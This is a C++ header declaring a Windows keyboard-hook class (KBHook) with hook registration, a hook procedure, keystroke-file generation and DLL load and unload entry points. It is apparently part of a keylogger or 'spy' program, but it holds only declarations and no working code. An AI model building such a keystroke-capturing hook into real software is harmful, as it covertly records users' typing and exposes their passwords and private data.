#pragma once
#include "spy.h"
#include "kbhfile.h"

class KBHook
{
	static HHOOK hook_handle;
	static KBHFile * kbhfile;
	static LRESULT CALLBACK hook_proc(int n_code, WPARAM w_param, LPARAM l_param);
	static VOID process_hkdt(WPARAM w_param, LPARAM l_param);
	static HHOOK register_hook(HINSTANCE dll_instance);
	static VOID unregister_hook();
	static void prepare_kbhfile();
	static void gen_kbhfile();
public:
	static DWORD load(HINSTANCE dllinst);
	static void unload();
};